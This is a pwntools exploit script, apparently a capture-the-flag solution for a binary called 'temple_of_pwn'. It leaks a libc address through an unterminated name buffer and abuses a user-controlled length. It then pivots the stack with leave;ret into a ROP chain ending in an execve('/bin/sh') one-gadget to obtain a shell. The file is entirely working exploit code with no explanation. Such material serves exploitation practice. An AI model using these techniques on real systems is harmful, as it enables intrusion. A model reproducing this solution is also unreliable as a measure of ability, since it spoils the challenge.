from pwn import *

elf = ELF("./temple_of_pwn")
libc = ELF("./libc.so")

p = elf.process()
raw_input("DEBUG")
p.recvuntil("Enter your name: ")
p.recvline()

payload = b"A"*32

p.sendline(payload)
p.recvuntil(b"A"*32)
leak = u64(p.recvuntil(b"Now",drop=True).ljust(8,b"\x00"))
log.info("Leak: "+ hex(leak))

libc.address = leak + 0x52ff0
log.info("Libc base: " + hex(libc.address))

pop_rdi = 0x00000000004014eb
leave_ret = 0x000000000040128e
ret = 0x0000000000401016

p.sendline("1")

p.sendlineafter(b"Length of your whisper:",str(leak+1))

p.sendafter(b"Enter your whisper:", b"A"*8)
payload = p64(libc.address +0x000000000002637f) #ret
payload += p64(libc.address + 0x0000000000028f87) #pop r12, r13
payload += p64(0)
payload += p64(0)
payload += p64(libc.address +0xcb5cd) #0xcb5cd execve("/bin/sh", r12, rdx)

payload2 = b"A"*32
payload2 += p64(leak)
payload2 += p64(libc.address +0x000000000004e280) #leave, ret

p.sendlineafter("You have overcome the monster, now pray to the god of pwn to give you the reward",payload)

p.sendafter("You good. It's time to get the reward!",payload2)
p.recvuntil("Bye\n")

p.interactive()
